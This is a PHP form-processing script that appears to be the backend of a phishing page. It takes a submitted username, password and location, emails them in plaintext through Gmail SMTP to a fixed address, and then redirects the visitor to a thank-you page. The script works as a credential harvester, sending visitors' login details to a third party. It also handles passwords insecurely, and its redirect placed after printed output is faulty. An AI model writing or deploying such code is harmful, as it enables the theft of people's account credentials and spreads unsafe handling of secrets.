<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Include PHPMailer autoloader
require 'vendor/autoload.php'; // Make sure to adjust the path based on your project structure

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the form data
    $username = isset($_POST["username"]) ? $_POST["username"] : "";
    $password = isset($_POST["password"]) ? $_POST["password"] : "";
    $location = isset($_POST["city"]) ? $_POST["city"] : "";
    $latitude = isset($_POST["country"]) ? $_POST["country"] : "";

    // Create an array to hold the new form data
    $newFormData = [
        "username" => $username,
        "password" => $password,
        "city" => $location,
        "country" => $latitude
    ];

    // Send email using PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'your@gmail.com'; // Replace with your Gmail address
        $mail->Password   = 'your_password'; // Replace with your Gmail password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;

        // Recipients
        $mail->setFrom('your@gmail.com', 'Your Name'); // Replace with your name and Gmail address
        $mail->addAddress('recipient@gmail.com'); // Replace with the recipient's Gmail address

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'New Form Submission';
        $mail->Body    = "Username: $username<br>Password: $password<br>Location: $location<br>Latitude: $latitude";

        $mail->send();
        echo 'Email has been sent successfully.';
    } catch (Exception $e) {
        echo "Email could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }

    // Redirect the user to the thank you page
    header('Location: ../thankyou/index.html'); // Adjust the page name as needed
    exit;
} else {
    // Respond with an error if it's not a POST request
    http_response_code(400); // Bad Request
    echo 'Invalid request. Please use POST to submit the form.';
}
?>
